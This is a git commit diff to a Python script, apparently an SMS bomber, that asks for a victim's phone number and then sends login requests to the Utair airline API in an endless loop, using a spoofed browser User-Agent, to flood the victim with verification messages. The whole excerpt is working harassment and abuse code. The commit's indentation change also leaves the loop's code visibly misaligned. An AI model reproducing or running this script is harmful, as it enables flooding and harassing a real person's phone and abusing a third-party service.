6a2897008f564bd940f227acc486150084e10f24
Bobsoc <87860555+Bobsoc@users.noreply.github.com>
2021-08-02 08:36:55 +0000

    Add files via upload

--- VityaB00MB.py
+++ VityaB00MB.py
@@ -14,7 +14,7 @@ phone = input("\033[32m Номер Бобика +")
 
 phone = str(phone)
 if (phone[0:2] == "+7" and len(phone[1:]) == 11) or (phone[0:4] == "+380" and len(phone[1:]) == 12):
-	while True: 
+    while True: 
     cl = requests.session()
     cl.get('https://b.utair.ru/api/v1/login/')
     rSL = requests.post('https://b.utair.ru/api/v1/login/', headers = {"Content-Type":"application/json", "Referer":"https://www.utair.ru/", "Sec-Fetch-Mode":"cors", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92 (Edition Yx 02)"}, json={"login":phone[1:]})
